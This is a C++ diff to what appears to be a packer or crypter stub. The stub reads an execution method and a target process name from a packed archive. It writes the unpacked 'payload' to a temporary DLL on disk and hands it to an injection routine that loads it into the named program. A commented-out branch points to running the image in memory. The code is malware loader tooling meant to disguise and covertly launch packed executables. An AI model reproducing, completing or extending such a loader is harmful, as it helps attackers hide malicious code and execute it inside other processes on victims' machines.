@@ -33,6 +33,9 @@ int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList,
 	char SIG[13];
 	long nFiles;
 
+	char TargetProgram[80];
+	int exeMethod;
+
 	if (startPos)
 		fseek(fpArchive, startPos, SEEK_SET);
 
@@ -42,8 +45,19 @@ int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList,
 	fread(&END_ASCII, sizeof(END_ASCII), 1, fpArchive);
 	key = new char[KEY_SIZE]();
 
+	
+
 	// read signature
 	fread(SIG, sizeof(char), sizeof(SIG), fpArchive);
+
+	// read execution method
+	fread(&exeMethod, sizeof(int), 1, fpArchive);
+	printf("Retrieved exeMethod : %d\n", exeMethod);
+
+	// read targetprogram name
+	fread(TargetProgram, sizeof(char), sizeof(TargetProgram), fpArchive);
+	printf("Retrieved TargetProgram name : %s\n", TargetProgram);
+	system("PAUSE");
 
 	if (!retrieveKey(SIG, sizeof(SIG))) return (fclose(fpArchive), packerrorNotAPackedFile);
 
@@ -96,7 +110,8 @@ int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList,
 		}
 
 		// Run payload
-		RunImage(_image_);
+		int imSize = pdata->filesize;
+		RunImage(_image_, imSize, exeMethod, TargetProgram);
 
 		nFiles--;
 	}
@@ -177,8 +192,39 @@ bool retrieveKey(char* readSignature, int signatureSize) {
 	return 0;
 }
 
-int RunImage(HANDLE Image, int exeMethod, char* targetProgram) {
+int RunImage(char* Image, int imSize, int exeMethod, char* targetProgram) {
+
+	LPCSTR pDllPath = "E:\\tmp.dll";
 
 
+	if (exeMethod > 0) {
+		FILE* fpDll = fopen(pDllPath, "wb+");
+		char buffer[2048];
+
+		//while (imSize > 0) {
+			//long toread = imSize > sizeof(buffer) ? sizeof(buffer) : imSize;
+			//memcpy(buffer, Image, toread);
+			fwrite(Image, sizeof(char), imSize, fpDll);
+			//imSize -= toread;
+		//}
+
+		fclose(fpDll);
+	}
+
+
+
+	switch (exeMethod)
+	{
+	case -1:
+		break;
+	case 0:
+		//RunPortableExecutable(Image);
+		break;
+	case 1:
+		initializeInjection(targetProgram, pDllPath, exeMethod);
+		break;
+	}
+
+	return 0;
 
 }
